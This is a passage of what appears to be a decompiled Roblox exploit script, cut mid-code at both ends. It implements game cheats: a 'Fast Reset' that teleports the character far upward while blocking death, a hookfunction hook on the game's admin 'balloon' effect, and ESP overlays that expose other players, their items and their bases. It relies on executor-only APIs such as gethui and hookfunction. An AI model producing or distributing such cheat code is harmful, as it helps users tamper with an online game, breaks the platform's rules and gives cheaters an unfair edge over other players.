			local flag9 = flag3 or humanoidRootPart ~= nil or clone ~= nil

			if flag9 then
				fn32()
			end

			return flag9
		end

		tbl.ResumeIfRequested = function(arg)
			if flag2 and arg == localPlayer.Character then
				fn35(arg, 0.05)
			end
		end

		local connection = localPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
			fn36()
			fn23()
		end)

		local connection2 = localPlayer.CharacterRemoving:Connect(function(character_)
			if character_ == localPlayer.Character or character_ == v12 then
				fn32()
			end
		end)

		local connection3 = localPlayer.CharacterAdded:Connect(function(character_)
			if v12 and v12 ~= character_ then
				fn32()
			end

			if flag2 then
				fn35(character_, 0.35)
			end
		end)

		fn2(function()
			flag2 = false
			flag4 = false
			flag8 = false
			fn32()
			fn16(connection)
			fn16(connection2)
			fn16(connection3)
			tbl.SuspendForReset = nil
			tbl.ResumeIfRequested = nil
			tbl.IsActive = nil
			tbl.GetDrop = nil
		end)
	end

	do
		local flag8 = true
		local flag9 = false
		local flag10 = true
		local flag11 = false
		local flag12 = false
		local v13 = nil
		local v14 = nil
		local flag13 = false
		local tbl4 = {}
		local connection = nil
		local chilliFastResetRuntime = CoreGui:FindFirstChild("__ChilliFastResetRuntime")

		if chilliFastResetRuntime then
			local cleanup = chilliFastResetRuntime:FindFirstChild("Cleanup")

			if cleanup and cleanup:IsA("BindableEvent") then
				pcall(function()
					cleanup:Fire()
				end)
			end

			pcall(function()
				chilliFastResetRuntime:Destroy()
			end)
		end

		local folder = Instance.new("Folder")
		folder.Name = "__ChilliFastResetRuntime"
		folder.Archivable = false
		folder.Parent = CoreGui
		local bindableEvent = Instance.new("BindableEvent")
		bindableEvent.Name = "Cleanup"
		bindableEvent.Parent = folder

		local function fn16()
			for _, v15 in ipairs(tbl4) do
				if v15.Connected then
					v15:Disconnect()
				end
			end

			table.clear(tbl4)
		end

		local function fn17()
			return localPlayer:GetAttribute("ChilliDropBrainrotActive") == true
		end

		local function fn18(arg, arg2)
			if not flag8 or flag9 then
				return false
			end
			local humanoid = arg and arg:FindFirstChildOfClass("Humanoid")
			if not arg or arg ~= localPlayer.Character or not humanoid or not arg2 and humanoid.Health <= 0 then
				return false
			end
			local flag14 = false

			if type(tbl.SuspendForReset) == "function" then
				local result
				flag14, result = pcall(tbl.SuspendForReset, arg)
				flag14 = flag14 and result == true
			end

			local humanoidRootPart2 = arg:FindFirstChild("HumanoidRootPart")

			if not humanoidRootPart2 then
				if flag14 and type(tbl.ResumeIfRequested) == "function" then
					tbl.ResumeIfRequested(arg)
				end

				return false
			end

			flag9 = true
			local v15 = arg

			task.spawn(function()
				local cFrame = humanoidRootPart2.CFrame
				local assemblyLinearVelocity = humanoidRootPart2.AssemblyLinearVelocity
				local assemblyAngularVelocity = humanoidRootPart2.AssemblyAngularVelocity
				local health = humanoid.Health
				local flag15 = true

				pcall(function()
					flag15 = humanoid:GetStateEnabled(Enum.HumanoidStateType.Dead)
					humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)

					if humanoid.Health <= 0 then
						humanoid.Health = math.max(humanoid.MaxHealth, 1)
					end
				end)

				local connection2 = humanoid.HealthChanged:Connect(function(health2)
					if flag8 and flag9 and localPlayer.Character == v15 and health2 <= 0 then
						pcall(function()
							humanoid.Health = math.max(humanoid.MaxHealth, health, 1)
						end)
					end
				end)

				local cFrame2 = cFrame + Vector3.new(0, 31000, 0)

				while flag8 and localPlayer.Character == v15 do
					if humanoidRootPart2.Parent then
						pcall(function()
							humanoidRootPart2.CFrame = cFrame2
						end)
					end

					if humanoid.Parent and humanoid.Health <= 0 then
						pcall(function()
							humanoid.Health = math.max(humanoid.MaxHealth, health, 1)
						end)
					end

					task.wait()
				end

				local flag16 = localPlayer.Character ~= v15
				connection2:Disconnect()

				if not flag16 then
					if humanoidRootPart2.Parent then
						pcall(function()
							humanoidRootPart2.CFrame = cFrame
							humanoidRootPart2.AssemblyLinearVelocity = assemblyLinearVelocity
							humanoidRootPart2.AssemblyAngularVelocity = assemblyAngularVelocity
						end)
					end

					if humanoid.Parent then
						pcall(function()
							humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, flag15)

							if health > 0 and humanoid.Health <= 0 then
								humanoid.Health = health
							end
						end)
					end
				end

				flag9 = false
			end)

			return true
		end

		local function fn19()
			return fn18(localPlayer.Character, false)
		end

		local function fn20()
			if not flag8 or not flag11 or flag12 then
				return
			end
			flag12 = true

			task.spawn(function()
				for i_ = 1, 20 do
					if not (not flag8 or not flag11 or flag9) then
						if not fn18(localPlayer.Character, false) then
							task.wait(0.05)
							continue
						end
					end

					break
				end

				flag12 = false
			end)
		end

		local function fn21()
			if flag13 and v13 and v14 and type(hookfunction) == "function" then
				pcall(function()
					hookfunction(v13, v14)
				end)
			end

			flag13 = false
			v13 = nil
			v14 = nil
		end

		local function fn22()
			if flag13 then
				return true
			end

			if type(hookfunction) ~= "function" then
				return false
			end

			local ok, result = pcall(function()
				return require(ReplicatedStorage.Datas.AdminCommands.balloon).effects.Victim
			end)

			if not ok or type(result) ~= "function" then
				return false
			end
			v13 = result
			local v15 = nil

			local ok2, result2 = pcall(function()
				return hookfunction(result, function(...)
					local v16 = table.pack(v15(...))

					if flag8 and flag11 then
						task.defer(fn20)
					end

					return table.unpack(v16, 1, v16.n)
				end)
			end)

			if not ok2 or type(result2) ~= "function" then
				v13 = nil
				return false
			end
			v15 = result2
			v14 = result2
			flag13 = true
			return true
		end

		local function fn23(arg)
			flag11 = arg == true
			flag12 = false

			if flag11 then
				if not fn22() then
					flag11 = false
				end
			else
				fn21()
			end
		end

		local function fn24(arg)
			fn16()
			if not flag8 or not flag10 or not arg then
				return
			end

			task.spawn(function()
				local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
				if not flag8 or not flag10 or not humanoid or arg ~= localPlayer.Character then
					return
				end
				local flag14 = false
				local flag15 = false

				local function fn25()
					local v15 = flag14
					local v16

					if flag14 then
						v16 = v15
					else
						v16 = flag15
					end

					if v16 or flag9 or arg ~= localPlayer.Character or fn17() then
						return
					end
					flag15 = true
					local rescueSerial = tbl2.RescueSerial

					task.defer(function()
						flag15 = false
						if flag14 or flag9 or arg ~= localPlayer.Character or fn17() or not humanoid.Parent then
							return
						end

						if tbl2.ProtectedHumanoid == humanoid and (humanoid.Health > 0 or tbl2.RescueSerial ~= rescueSerial) then
							return
						end

						if humanoid.Health > 0 then
							return
						end
						flag14 = fn18(arg, true) == true
					end)
				end

				tbl4[#tbl4 + 1] = humanoid.HealthChanged:Connect(function(health)
					if health <= 0 then
						fn25()
					end
				end)

				tbl4[#tbl4 + 1] = humanoid.Died:Connect(fn25)
			end)
		end

		local function fn25(arg)
			flag10 = arg == true

			if flag10 then
				fn24(localPlayer.Character)
			else
				fn16()
			end
		end

		local function fn26()
			if not flag8 then
				return
			end
			flag8 = false
			flag9 = false
			flag10 = false
			flag11 = false
			flag12 = false
			fn16()
			fn21()

			if connection then
				connection:Disconnect()
				connection = nil
			end
		end

		connection = localPlayer.CharacterAdded:Connect(function(character_)
			flag9 = false

			if flag10 then
				fn24(character_)
			end
		end)

		bindableEvent.Event:Connect(fn26)
		folder.Destroying:Connect(fn26)
		v8:CreateButton({ Name = "Fast Reset", ButtonText = "Reset", Callback = fn19 })
		v8:CreateToggle({ Name = "Auto Fast Reset", Default = true, Callback = fn25 })
		v8:CreateToggle({ Name = "Auto Reset Balloon", Default = false, Callback = fn23 })
		fn24(localPlayer.Character)
	end

	local v13
	v13 = esp:CreateSection({ Name = "Player ESP", Expanded = false })
	v9 = esp:CreateSection({ Name = "Brainrot ESP", Expanded = false })
	v10 = esp:CreateSection({ Name = "Brainrot Notifications", Expanded = false })
	v11 = esp:CreateSection({ Name = "Base ESP", Expanded = false })

	fn4 = function()
		if type(gethui) == "function" then
			local ok, result = pcall(gethui)
			if ok and typeof(result) == "Instance" then
				return result
			end
		end

		return CoreGui
	end

	fn5 = function(name)
		local v14 = fn4()
		local tbl4 = {}

		for _, v15 in ipairs({ v14, CoreGui }) do
			if v15 and not tbl4[v15] then
				tbl4[v15] = true
				local v16 = v15:FindFirstChild(name)

				if v16 then
					local cleanup = v16:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)
					end

					pcall(function()
						v16:Destroy()
					end)
				end
			end
		end

		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = name
		screenGui.Archivable = false
		screenGui.ResetOnSpawn = false
		screenGui.IgnoreGuiInset = true
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.DisplayOrder = 48
		screenGui.Parent = v14
		local bindableEvent = Instance.new("BindableEvent")
		bindableEvent.Name = "Cleanup"
		bindableEvent.Parent = screenGui
		return screenGui, bindableEvent
	end

	fn6 = function(arg)
		for _, v14 in ipairs(arg) do
			if typeof(v14) == "RBXScriptConnection" then
				v14:Disconnect()
			end
		end

		table.clear(arg)
	end

	fn7 = function()
		local v14 = Workspace:FindFirstChild(localPlayer.Name)
		if not v14 or not v14:IsA("Model") then
			return nil
		end
		local humanoidRootPart2 = v14:FindFirstChild("HumanoidRootPart")
		if humanoidRootPart2 and humanoidRootPart2:IsA("BasePart") and humanoidRootPart2.Parent == v14 then
			return humanoidRootPart2
		end
		local hitbox = v14:FindFirstChild("__HITBOX") or v14:FindFirstChild("__hitbox") or v14:FindFirstChild("Hitbox") or v14:FindFirstChild("HitBox")
		if hitbox and hitbox:IsA("BasePart") then
			return hitbox
		end
		return nil
	end

	fn8 = function(arg)
		arg = arg and arg:FindFirstChild("PlotSign")
		if not arg then
			return nil
		end

		for _, descendant in ipairs(arg:GetDescendants()) do
			if descendant:IsA("TextLabel") then
				local str = tostring(descendant.Text or "")
				if str ~= "" and string.lower(str) ~= "your base" and string.find(string.lower(str), "base", 1, true) then
					return descendant
				end
			end
		end

		return nil
	end

	local fn16

	fn16 = function(arg)
		local str = fn8(arg)

		if str then
			str = tostring(str.Text or "")
		end

		str = str or ""
		return str ~= "" and str or "Base"
	end

	fn9 = function(arg)
		local v14 = string.lower(fn16(arg))
		return string.find(v14, string.lower(localPlayer.Name), 1, true) ~= nil or string.find(v14, string.lower(localPlayer.DisplayName), 1, true) ~= nil
	end

	local fn17
	local n8 = 12

	fn17 = function(arg)
		if not arg then
			return nil
		end
		local animalPodiums = arg:FindFirstChild("AnimalPodiums")
		local huge = math.huge
		local n9 = -math.huge
		local n10 = -math.huge
		local huge2 = math.huge
		local huge3 = math.huge

		if animalPodiums then
			for _, child in ipairs(animalPodiums:GetChildren()) do
				local base = child:FindFirstChild("Base")
				base = base and base:FindFirstChild("Spawn")

				if base and base:IsA("BasePart") then
					local position = base.Position
					huge3 = math.min(huge3, position.X)
					n10 = math.max(n10, position.X)
					huge = math.min(huge, position.Z)
					n9 = math.max(n9, position.Z)
					huge2 = math.min(huge2, position.Y)
				end
			end
		end

		local stealHitbox = arg:FindFirstChild("StealHitbox")
		local x, z

		if stealHitbox and stealHitbox:IsA("BasePart") then
			x = stealHitbox.Position.X
			z = stealHitbox.Position.Z

			if huge2 == math.huge then
				huge2 = stealHitbox.Position.Y - stealHitbox.Size.Y * 0.5
			end
		elseif huge3 ~= math.huge then
			x = (huge3 + n10) * 0.5
			z = (huge + n9) * 0.5
		else
			local mainRoot = arg:FindFirstChild("MainRoot")
			local isBasePart = mainRoot and mainRoot:IsA("BasePart")
			z = nil
			x = nil

			if isBasePart then
				x = mainRoot.Position.X
				z = mainRoot.Position.Z
				huge2 = mainRoot.Position.Y
			end
		end

		if not x or huge2 == math.huge then
			return nil
		end
		return Vector3.new(x, huge2 + n8, z)
	end

	local fn18

	fn18 = function(arg)
		return arg and arg:IsA("BasePart") and (arg.Name == "PlotSign" or arg.Name == "MainRoot" or arg.Name == "Spawn")
	end

	tbl3 = { YourBaseClear = false, ClearBaseTransparency = 0.8 }
	local tbl4 = {}

	fn10 = function(arg)
		tbl4[#tbl4 + 1] = arg
	end

	fn11 = function(arg, arg2)
		if tbl3[arg] == arg2 then
			return
		end
		tbl3[arg] = arg2

		for _, v14 in ipairs(tbl4) do
			pcall(v14, arg, arg2)
		end
	end

	do
		local v14 = nil

		local ok, result = pcall(function()
			return require(ReplicatedStorage.Datas.Index)
		end)

		if ok and type(result) == "table" then
			v14 = result
		end

		fn12 = function(arg)
			local tbl5 = {}
			local v15 = v14 and v14[arg]
			if not v15 then
				return tbl5
			end

			if type(v15.BaseColors) == "table" then
				for _, baseColor in pairs(v15.BaseColors) do
					if typeof(baseColor) == "Color3" then
						tbl5[#tbl5 + 1] = baseColor
					end
				end
			end

			if #tbl5 == 0 and typeof(v15.MainColor) == "Color3" then
				tbl5[#tbl5 + 1] = v15.MainColor
			end

			return tbl5
		end
	end

	local n9
	n9 = 5
	local n10
	n10 = 12
	local n11
	n11 = 4.5
	local tbl5
	tbl5 = { "HumanoidRootPart", "LowerTorso", "UpperTorso", "Torso", "Head" }
	local font
	font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Italic)
	local n12
	n12 = 0.25
	local transparency
	transparency = 0
	local tbl6

	tbl6 = {
		Head = true,
		Torso = true,
		UpperTorso = true,
		LowerTorso = true,
		["Left Arm"] = true,
		["Right Arm"] = true,
		["Left Leg"] = true,
		["Right Leg"] = true,
		LeftUpperArm = true,
		LeftLowerArm = true,
		LeftHand = true,
		RightUpperArm = true,
		RightLowerArm = true,
		RightHand = true,
		LeftUpperLeg = true,
		LeftLowerLeg = true,
		LeftFoot = true,
		RightUpperLeg = true,
		RightLowerLeg = true,
		RightFoot = true,
	}

	local font2
	font2 = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
	local v14

	do
		local colorSequence = ColorSequence.new
		local tbl7 = {}
		local v15 = ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 255, 205))
		local v16 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(125, 225, 255))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		tbl7[1] = v15
		tbl7[2] = v16

		do
			local values = table.pack(new(1, color(210, 135, 255)))
			table.move(values, 1, values.n, 3, tbl7)
		end

		v14 = colorSequence(tbl7)
	end

	local colorSequence

	do
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		colorSequence = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(7, 73, 66)), new(1, color(35, 17, 79)) })
	end

	local v15

	do
		local colorSequence2 = ColorSequence.new
		local tbl7 = {}
		local v16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 105, 105))
		local v17 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 28, 40))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		tbl7[1] = v16
		tbl7[2] = v17

		do
			local values = table.pack(new(1, color(184, 0, 18)))
			table.move(values, 1, values.n, 3, tbl7)
		end

		v15 = colorSequence2(tbl7)
	end

	local v16

	do
		local colorSequence2 = ColorSequence.new
		local tbl7 = {}
		local v17 = ColorSequenceKeypoint.new(0, Color3.fromRGB(124, 0, 15))
		local v18 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(61, 0, 9))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		tbl7[1] = v17
		tbl7[2] = v18

		do
			local values = table.pack(new(1, color(18, 0, 3)))
			table.move(values, 1, values.n, 3, tbl7)
		end

		v16 = colorSequence2(tbl7)
	end

	local tbl7

	tbl7 = {
		[""] = 1,
		K = 1000,
		M = 1000000,
		B = 1e9,
		T = 1e12,
		Qa = 1e15,
		Qi = 1e18,
		Sx = 1e21,
		Sp = 1e24,
		Oc = 1e27,
		No = 1e30,
		Dc = 1e33,
	}

	local tbl8
	tbl8 = {}
	local tbl9

	tbl9 = {
		Limit = 1000000,
		Fill = Color3.fromRGB(255, 196, 66),
		Outline = Color3.fromRGB(255, 232, 152),
	}

	do
		local colorSequence2 = ColorSequence.new
		local tbl10 = {}
		local v17 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 231, 158))
		local v18 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 196, 66))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		tbl10[1] = v17
		tbl10[2] = v18

		do
			local values = table.pack(new(1, color(214, 142, 12)))
			table.move(values, 1, values.n, 3, tbl10)
		end

		tbl9.Text = colorSequence2(tbl10)
	end

	do
		local colorSequence2 = ColorSequence.new
		local tbl10 = {}
		local v17 = ColorSequenceKeypoint.new(0, Color3.fromRGB(122, 76, 0))
		local v18 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(62, 38, 0))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		tbl10[1] = v17
		tbl10[2] = v18

		do
			local values = table.pack(new(1, color(20, 12, 0)))
			table.move(values, 1, values.n, 3, tbl10)
		end

		tbl9.Stroke = colorSequence2(tbl10)
	end

	do
		local tbl10 = {
			Limit = 10000000,
			Fill = Color3.fromRGB(255, 146, 40),
			Outline = Color3.fromRGB(255, 194, 112),
		}

		local colorSequence2 = ColorSequence.new
		local tbl11 = {}
		local v17 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 198, 132))
		local v18 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 146, 40))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		tbl11[1] = v17
		tbl11[2] = v18

		do
			local values = table.pack(new(1, color(206, 92, 0)))
			table.move(values, 1, values.n, 3, tbl11)
		end

		tbl10.Text = colorSequence2(tbl11)
		local colorSequence3 = ColorSequence.new
		local tbl12 = {}
		local v19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 50, 0))
		local v20 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 25, 0))
		local new2 = ColorSequenceKeypoint.new
		local color2 = Color3.fromRGB
		tbl12[1] = v19
		tbl12[2] = v20

		do
			local values = table.pack(new2(1, color2(18, 8, 0)))
			table.move(values, 1, values.n, 3, tbl12)
		end

		tbl10.Stroke = colorSequence3(tbl12)

		local tbl13 = {
			Limit = 100000000,
			Fill = Color3.fromRGB(255, 82, 38),
			Outline = Color3.fromRGB(255, 140, 96),
		}

		local colorSequence4 = ColorSequence.new
		local tbl14 = {}
		local v21 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 158, 116))
		local v22 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 82, 38))
		local new3 = ColorSequenceKeypoint.new
		local color3 = Color3.fromRGB
		tbl14[1] = v21
		tbl14[2] = v22

		do
			local values = table.pack(new3(1, color3(196, 40, 0)))
			table.move(values, 1, values.n, 3, tbl14)
		end

		tbl13.Text = colorSequence4(tbl14)
		local colorSequence5 = ColorSequence.new
		local tbl15 = {}
		local v23 = ColorSequenceKeypoint.new(0, Color3.fromRGB(108, 24, 0))
		local v24 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(54, 12, 0))
		local new4 = ColorSequenceKeypoint.new
		local color4 = Color3.fromRGB
		tbl15[1] = v23
		tbl15[2] = v24

		do
			local values = table.pack(new4(1, color4(18, 4, 0)))
			table.move(values, 1, values.n, 3, tbl15)
		end

		tbl13.Stroke = colorSequence5(tbl15)

		local tbl16 = {
			Limit = math.huge,
			Fill = Color3.fromRGB(220, 12, 28),
			Outline = Color3.fromRGB(255, 55, 65),
			Text = v15,
			Stroke = v16,
		}

		tbl8[1] = tbl9
		tbl8[2] = tbl10
		tbl8[3] = tbl13
		tbl8[4] = tbl16
	end

	local fn19

	local function fn20(arg)
		if type(arg) ~= "string" then
			return nil
		end
		local match, str = arg:match("%$%s*([%d%.]+)%s*(%a*)")
		local num = tonumber(match)
		if not num then
			return nil
		end

		if str ~= "" then
			str = str:sub(1, 1):upper() .. str:sub(2):lower()
		end

		return num * (tbl7[str] or 1)
	end

	fn19 = function(arg)
		local v17 = fn20(arg)
		if not v17 then
			return tbl8[#tbl8]
		end

		for _, v18 in ipairs(tbl8) do
			if v17 < v18.Limit then
				return v18
			end
		end

		return tbl8[#tbl8]
	end

	local screenGui

	do
		local function fn21()
			if type(gethui) == "function" then
				local ok, result = pcall(gethui)
				if ok and typeof(result) == "Instance" then
					return result
				end
			end

			return CoreGui
		end

		local v17 = fn21()
		local tbl10 = {}

		for _, v18 in ipairs({ v17, CoreGui }) do
			if v18 and not tbl10[v18] then
				tbl10[v18] = true
				local chilliPlayerESPRuntime = v18:FindFirstChild("__ChilliPlayerESPRuntime")

				if chilliPlayerESPRuntime then
					local cleanup = chilliPlayerESPRuntime:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)
					end

					pcall(function()
						chilliPlayerESPRuntime:Destroy()
					end)
				end
			end
		end

		screenGui = Instance.new("ScreenGui")
		screenGui.Name = "__ChilliPlayerESPRuntime"
		screenGui.Archivable = false
		screenGui.ResetOnSpawn = false
		screenGui.IgnoreGuiInset = true
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.DisplayOrder = 50
		screenGui.Parent = v17
	end

	local bindableEvent
	bindableEvent = Instance.new("BindableEvent")
	bindableEvent.Name = "Cleanup"
	bindableEvent.Parent = screenGui
	local flag8, tbl10, n13, tbl11, tbl12, n14, fn21, fn22, fn23, fn24

	do
		local v17 = screenGui
		flag8 = false

		tbl10 = {
			Name = true,
			Username = false,
			Avatar = true,
			Tool = true,
			Brainrot = true,
			["Admin Panel"] = true,
		}

		n13 = 1
		tbl11 = {}
		tbl12 = {}
		local tbl13 = {}
		n14 = 0

		fn21 = function(arg)
			for _, v18 in ipairs(arg) do
				if v18.Connected then
					v18:Disconnect()
				end
			end

			table.clear(arg)
		end

		fn22 = function(arg)
			local nameDisplayHumanoid = arg.NameDisplayHumanoid
			local nameDisplayDistance = arg.NameDisplayDistance

			if nameDisplayHumanoid and nameDisplayHumanoid.Parent and nameDisplayDistance ~= nil then
				pcall(function()
					nameDisplayHumanoid.NameDisplayDistance = nameDisplayDistance
				end)
			end

			arg.NameDisplayHumanoid = nil
			arg.NameDisplayDistance = nil
		end

		fn23 = function(arg, nameDisplayHumanoid)
			nameDisplayHumanoid = nameDisplayHumanoid and nameDisplayHumanoid:FindFirstChildOfClass("Humanoid")
			if not nameDisplayHumanoid then
				return
			end

			if arg.NameDisplayHumanoid ~= nameDisplayHumanoid then
				fn22(arg)
				arg.NameDisplayHumanoid = nameDisplayHumanoid
				arg.NameDisplayDistance = nameDisplayHumanoid.NameDisplayDistance
			end

			nameDisplayHumanoid.NameDisplayDistance = 0
		end

		local function fn25(arg)
			local str = tostring(arg or "")
			if str == "" then
				return ""
			end

			if str:match("^%d+$") then
				return "rbxassetid://" .. str
			end
			return str
		end

		local function fn26(arg)
			if not arg or not arg:IsA("Tool") then
				return ""
			end
			local v18 = fn25(arg.TextureId)
			if v18 ~= "" then
				return v18
			end

			for _, v19 in ipairs({ "Icon", "Image", "Thumbnail", "TextureId" }) do
				local attribute = arg:GetAttribute(v19)
				if type(attribute) ~= "string" then
					continue
				end
				v18 = fn25(attribute)
				if v18 ~= "" then
					return v18
				end
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("Decal") or descendant:IsA("Texture") then
					v18 = fn25(descendant.Texture)
				elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
					v18 = fn25(descendant.Image)
				end

				if v18 ~= "" then
					return v18
				end
			end

			return ""
		end

		local function fn27(arg)
			return arg and arg:FindFirstChildOfClass("Tool") or nil
		end

		fn24 = function(arg, arg2)
			for _, v18 in ipairs(tbl5) do
				local v19 = arg:FindFirstChild(v18)
				if v19 and v19:IsA("BasePart") then
					return v19
				end
			end

			return arg2
		end

		local function fn28(arg, arg2)
			if arg2 == arg then
				return Vector3.new(0, 3.1, 0)
			end
			local n15 = arg.Position.Y - arg2.Position.Y
			if math.abs(n15) <= n11 then
				return Vector3.new(0, math.clamp(n15 + 3.1, 3.8, 6), 0)
			end
			return Vector3.new(0, 4.8, 0)
		end

		local function fn29(arg, arg2)
			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("Weld") or descendant:IsA("WeldConstraint") then
					local part0 = descendant.Part0
					local part1 = descendant.Part1
					local v18

					if part0 and not part0:IsDescendantOf(arg) then
						v18 = part0
					else
						local flag9 = part1 and not part1:IsDescendantOf(arg)
						local v19 = nil
						local v20 = nil

						if flag9 then
							v18 = part1
							part1 = part0
						else
							v18 = v19
							part1 = v20
						end
					end

					if v18 and v18:IsA("BasePart") and v18.Parent == Workspace and part1 and part1:IsA("BasePart") and part1:IsDescendantOf(arg) and (v18.Position - arg2.Position).Magnitude <= n9 then
						return v18, part1
					end
				end
			end

			return nil
		end

		local function fn30(arg)
			if type(arg) ~= "string" or not arg:find("/s", 1, true) then
				return false
			end
			local match = arg:match("%$([%d%.]+)")
			local flag9 = match ~= nil

			if flag9 then
				flag9 = (tonumber(match) or 0) > 0
			end

			return flag9
		end

		local function fn31(arg, arg2)
			for k, v18 in pairs(arg:GetAttributes()) do
				if k ~= "__AssetDescendantCount" and arg2:GetAttribute(k) ~= v18 then
					return false
				end
			end

			return true
		end

		local function fn32(arg)
			local generation = arg:FindFirstChild("Generation", true)
			if generation and generation:IsA("TextLabel") and fn30(generation.Text) then
				return generation
			end
			local plots = Workspace:FindFirstChild("Plots")
			local debris = Workspace:FindFirstChild("Debris")
			if not plots or not debris then
				return nil
			end
			local tbl14 = {}
			local tbl15 = {}

			for _, child in ipairs(plots:GetChildren()) do
				for _, child2 in ipairs(child:GetChildren()) do
					if child2:IsA("Model") and child2.Name == arg.Name then
						local position = child2:GetPivot().Position
						tbl15[#tbl15 + 1] = position

						if fn31(arg, child2) then
							tbl14[#tbl14 + 1] = position
						end
					end
				end
			end

			tbl14 = #tbl14 > 0 and tbl14 or tbl15
			if #tbl14 == 0 then
				return nil
			end
			local mutation = arg:FindFirstChild("Mutation", true)
			local text = mutation and mutation:IsA("TextLabel") and mutation.Text or nil
			local huge = math.huge
			local v18 = nil

			for _, child in ipairs(debris:GetChildren()) do
				if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
					local animalOverhead = child:FindFirstChild("AnimalOverhead")
					local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")
					local generation2 = animalOverhead and animalOverhead:FindFirstChild("Generation")
					animalOverhead = animalOverhead and animalOverhead:FindFirstChild("Mutation")

					if displayName and displayName:IsA("TextLabel") and displayName.Text == arg.Name and generation2 and generation2:IsA("TextLabel") and fn30(generation2.Text) then
						local huge2 = math.huge

						for _, v19 in ipairs(tbl14) do
							huge2 = math.min(huge2, (child.Position - v19).Magnitude)
						end

						local flag9 = text and animalOverhead and animalOverhead:IsA("TextLabel") and animalOverhead.Text ~= text
						local n15 = 0

						if flag9 then
							n15 = 1000
						end

						local n16 = huge2 + n15

						if n16 < huge then
							huge = n16
							v18 = generation2
						end
					end
				end
			end

			return v18
		end

		local function fn33(arg)
			if not arg then
				return nil
			end
			local mutation = arg:FindFirstChild("Mutation", true)
			if mutation and mutation:IsA("TextLabel") then
				return mutation
			end
			return nil
		end

		local function fn34(arg)
			if not (arg and arg.Parent and arg.Visible) then
				return nil
			end
			local str = tostring(arg.Text or "")
			if str == "" then
				return nil
			end

			local tbl14 = {
				Text = str,
				RichText = arg.RichText == true,
				Color = arg.TextColor3,
				Font = arg.FontFace,
				Gradient = nil,
				StrokeColor = nil,
			}

			local uiStroke = arg:FindFirstChildOfClass("UIStroke")

			if uiStroke then
				tbl14.StrokeColor = uiStroke.Color
			end

			local uiGradient = arg:FindFirstChildOfClass("UIGradient")

			if uiGradient then
				tbl14.Gradient = { Color = uiGradient.Color, Rotation = uiGradient.Rotation }
			end

			return tbl14
		end

		local function fn35(arg)
			if arg:GetAttribute("Stealing") ~= true then
				return nil
			end
			local character_ = arg.Character
			local humanoidRootPart2 = character_ and character_:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart2 then
				return nil
			end
			local huge = math.huge
			local v18 = nil

			for _, child in ipairs(Workspace:GetChildren()) do
				if child:IsA("Model") and child ~= character_ and not Players:GetPlayerFromCharacter(child) and child.Name:sub(-6) ~= "_Clone" then
					local rootPart = child:FindFirstChild("RootPart") or child.PrimaryPart or child:FindFirstChildWhichIsA("BasePart")

					if rootPart and rootPart:IsA("BasePart") then
						local v19, v20 = fn29(child, humanoidRootPart2)

						if v19 and v20 then
							local v21 = humanoidRootPart2.CFrame:PointToObjectSpace(v19.Position)
							local magnitude = (v20.Position - humanoidRootPart2.Position).Magnitude

							if math.abs(v21.X) <= 4 and v21.Y >= -2 and v21.Y <= 6 and v21.Z >= -6 and v21.Z <= 3 and magnitude <= n10 then
								local n15 = (v19.Position - humanoidRootPart2.Position).Magnitude + magnitude * 0.05

								if n15 < huge then
									huge = n15
									v18 = child
								end
							end
						end
					end
				end
			end

			if not v18 then
				return nil
			end
			local v19 = fn32(v18)
			return v18.Name, v18, v19 and v19.Text or nil, v19, fn33(v18)
		end

		local function fn36()
			local currentCamera = Workspace.CurrentCamera
			return math.max(1, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.024, 26, 35) * n13))
		end

		local function fn37(text, font3, size)
			local getTextBoundsParams = Instance.new("GetTextBoundsParams")
			getTextBoundsParams.Text = text
			getTextBoundsParams.Font = font3
			getTextBoundsParams.Size = size
			getTextBoundsParams.Width = 1000

			local ok, result = pcall(function()
				return TextService:GetTextBoundsAsync(getTextBoundsParams)
			end)

			getTextBoundsParams:Destroy()
			if ok then
				return result.X
			end
			return (utf8.len(text) or #text) * size * 0.56
		end

